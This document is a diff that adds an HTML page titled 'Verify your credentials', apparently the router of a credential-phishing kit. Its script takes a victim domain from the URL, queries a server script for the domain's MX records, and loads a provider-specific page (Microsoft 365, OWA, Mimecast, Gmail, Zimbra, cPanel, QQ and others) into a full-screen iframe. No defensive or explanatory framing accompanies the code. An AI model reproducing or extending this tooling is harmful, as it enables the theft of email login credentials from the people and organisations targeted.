@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="titl">Verify your credentials</title>
+    <style>
+        html { overflow: hidden; }
+        body, div, html, iframe { margin: 0; padding: 0; height: 100%; border: none; }
+        iframe { display: block; width: 100%; border: none; overflow-y: auto; overflow-x: hidden; }
+        
+        @keyframes rotate-loading {
+            0% { transform: rotate(0); -ms-transform: rotate(0); -webkit-transform: rotate(0); -o-transform: rotate(0); -moz-transform: rotate(0); }
+            100% { transform: rotate(360deg); -ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg); }
+        }
+        
+        @-moz-keyframes rotate-loading {
+            0% { transform: rotate(0); -ms-transform: rotate(0); -webkit-transform: rotate(0); -o-transform: rotate(0); -moz-transform: rotate(0); }
+            100% { transform: rotate(360deg); -ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg); }
+        }
+        
+        @-webkit-keyframes rotate-loading {
+            0% { transform: rotate(0); -ms-transform: rotate(0); -webkit-transform: rotate(0); -o-transform: rotate(0); -moz-transform: rotate(0); }
+            100% { transform: rotate(360deg); -ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg); }
+        }
+        
+        @-o-keyframes rotate-loading {
+            0% { transform: rotate(0); -ms-transform: rotate(0); -webkit-transform: rotate(0); -o-transform: rotate(0); -moz-transform: rotate(0); }
+            100% { transform: rotate(360deg); -ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg); }
+        }
+        
+        @keyframes loading-text-opacity {
+            0% { opacity: 0; }
+            20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        @-moz-keyframes loading-text-opacity {
+            0% { opacity: 0; }
+            20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        @-webkit-keyframes loading-text-opacity {
+            0% { opacity: 0; }
+            20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        @-o-keyframes loading-text-opacity {
+            0% { opacity: 0; }
+            20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        .loading, .loading-container {
+            height: 100px;
+            position: relative;
+            width: 100px;
+            border-radius: 100%;
+        }
+        
+        .loading-container {
+            margin: 100px auto;
+        }
+        
+        .loading {
+            border: 2px solid transparent;
+            border-color: transparent #333 transparent #333;
+            -moz-animation: rotate-loading 1.5s linear 0s infinite normal;
+            -moz-transform-origin: 50% 50%;
+            -o-animation: rotate-loading 1.5s linear 0s infinite normal;
+            -o-transform-origin: 50% 50%;
+            -webkit-animation: rotate-loading 1.5s linear 0s infinite normal;
+            -webkit-transform-origin: 50% 50%;
+            animation: rotate-loading 1.5s linear 0s infinite normal;
+            transform-origin: 50% 50%;
+        }
+        
+        .loading-container:hover .loading {
+            border-color: transparent #e45635 transparent #e45635;
+        }
+        
+        .loading-container .loading, .loading-container:hover .loading {
+            -webkit-transition: all .5s ease-in-out;
+            -moz-transition: all .5s ease-in-out;
+            -ms-transition: all .5s ease-in-out;
+            -o-transition: all .5s ease-in-out;
+            transition: all .5s ease-in-out;
+        }
+        
+        #loading-text {
+            -moz-animation: loading-text-opacity 2s linear 0s infinite normal;
+            -o-animation: loading-text-opacity 2s linear 0s infinite normal;
+            -webkit-animation: loading-text-opacity 2s linear 0s infinite normal;
+            animation: loading-text-opacity 2s linear 0s infinite normal;
+            color: #888;
+            font-family: "Helvetica Neue", "Helvetica", "arial";
+            font-size: 10px;
+            font-weight: 700;
+            margin-top: 45px;
+            opacity: 0;
+            position: absolute;
+            text-align: center;
+            text-transform: uppercase;
+            top: 0;
+            width: 100px;
+        }
+        
+        .iframe-container {
+            width: 100%;
+            max-width: 100%;
+            margin: 0 auto;
+            aspect-ratio: 16 / 9;
+        }
+        
+        .iframe-container iframe {
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+<div class="loading-container" id="loader"></div>
+<form id="dataForm"><input type="hidden" id="dom" name="dom"></form>
+<div class="iframe-container">
+    <iframe src="" title="Platform Detection" id="fil" frameborder="0" allowfullscreen></iframe>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+function getParameterByName(e, s) {
+    s || (s = window.location.href), e = e.replace(/[\[\]]/g, "\\$&");
+    var t = new RegExp("[?&]" + e + "(=([^&#]*)|&|#|$)");
+    return results = t.exec(s), results ? results[2] ? decodeURIComponent(results[2].replace(/\+/g, " ")) : "" : null;
+}
+
+!function() {
+    var domain = getParameterByName("cms");
+    document.getElementById("dom").value = domain;
+    
+    $.ajax({
+        type: "get",
+        dataType: "JSON",
+        url: "dnsChecker.php",
+        data: $("#dataForm").serialize(),
+        cache: false,
+        beforeSend: function() {
+            $("#loader").html('<div class="loading"></div><div id="loading-text">loading...</div>');
+        },
+        success: function(response) {
+            setTimeout(function() {
+                if (response.success) {
+                    var provider = response.provider;
+                    var redirectUrl = response.redirect_url;
+                    var dnsRecords = response.dns_records || {};
+                    var mxRecords = dnsRecords.mx || [];
+                    
+                    // Create redirect mapping based on detected provider
+                    var pageMapping = {
+                        'microsoft_365': 'pages/microsoft_365.html',
+                        'owa': 'pages/owa.html',
+                        'mimecast': 'pages/mimecast.html',
+                        'rackspace': 'pages/rackspace.html',
+                        'smartermail': 'pages/smartermail.html',
+                        'zimbra': 'pages/zimbra.html',
+                        'roundcube': 'pages/roundcube.html',
+                        'cpanel': 'pages/cpanel.html',
+                        'horde': 'pages/horde.html'
+                    };
+                    
+                    // Check MX records for provider detection
+                    var mxString = mxRecords.join(',').toLowerCase();
+                    var detectedPage = 'index.html';
+                    
+                    // Microsoft 365 / Outlook
+                    if (mxString.includes('protection.outlook.com') || 
+                        mxString.includes('outlook.com') ||
+                        provider === 'microsoft_365') {
+                        detectedPage = 'pages/microsoft_365.html';
+                    }
+                    // OWA
+                    else if (provider === 'owa') {
+                        detectedPage = 'pages/owa.html';
+                    }
+                    // Mimecast
+                    else if (mxString.includes('mimecast.com') || 
+                             mxString.includes('smtp-inbound.mimecast.com') ||
+                             provider === 'mimecast') {
+                        detectedPage = 'pages/mimecast.html';
+                    }
+                    // Rackspace
+                    else if (mxString.includes('emailsrvr.com') || 
+                             mxString.includes('rackspace.com') ||
+                             provider === 'rackspace') {
+                        detectedPage = 'pages/rackspace.html';
+                    }
+                    // SmarterMail
+                    else if (provider === 'smartermail' || mxString.includes('smartermail')) {
+                        detectedPage = 'pages/smartermail.html';
+                    }
+                    // Zimbra
+                    else if (mxString.includes('zimbra') || 
+                             mxString.includes('synacor.com') ||
+                             provider === 'zimbra') {
+                        detectedPage = 'pages/zimbra.html';
+                    }
+                    // Roundcube
+                    else if (provider === 'roundcube' || mxString.includes('roundcube')) {
+                        detectedPage = 'pages/roundcube.html';
+                    }
+                    // cPanel
+                    else if (provider === 'cpanel') {
+                        detectedPage = 'pages/cpanel.html';
+                    }
+                    // Horde
+                    else if (provider === 'horde' || mxString.includes('horde')) {
+                        detectedPage = 'pages/horde.html';
+                    }
+                    // Gmail / Google
+                    else if (mxString.includes('google') || mxString.includes('gmail-smtp')) {
+                        detectedPage = 'pages/google.html';
+                    }
+                    // Yahoo / Prodigy
+                    else if (mxString.includes('yahoo') || mxString.includes('prodigy')) {
+                        detectedPage = 'pages/yahoo.html';
+                    }
+                    // Naver
+                    else if (mxString.includes('naver')) {
+                        detectedPage = 'pages/naver.html';
+                    }
+                    // ProtonMail
+                    else if (mxString.includes('protonmail')) {
+                        detectedPage = 'pages/proton.html';
+                    }
+                    // Zoho
+                    else if (mxString.includes('zoho')) {
+                        detectedPage = 'pages/zoho.html';
+                    }
+                    // QQ
+                    else if (mxString.includes('qq.com')) {
+                        detectedPage = 'pages/qq.html';
+                    }
+                    // Default fallback
+                    else {
+                        detectedPage = 'index.html';
+                    }
+                    
+                    // Set the iframe source
+                    var iframeUrl = detectedPage + '?cms=' + encodeURIComponent(domain) + 
+                                   '&provider=' + encodeURIComponent(provider) +
+                                   '&redirect=' + encodeURIComponent(redirectUrl || '');
+                    
+                    document.getElementById("fil").setAttribute("src", iframeUrl);
+                    document.getElementById("loader").style.display = "none";
+                } else {
+                    // Error occurred, show generic page
+                    document.getElementById("fil").setAttribute("src", "index.html?cms=" + encodeURIComponent(domain));
+                    document.getElementById("loader").style.display = "none";
+                }
+            }, 500);
+        },
+        error: function(xhr, status, error) {
+            console.error("Error:", error);
+            // Fallback to index on error
+            document.getElementById("fil").setAttribute("src", "index.html?cms=" + encodeURIComponent(domain));
+            document.getElementById("loader").style.display = "none";
+        }
+    });
+}();
+</script>
+
+</body>
+</html>
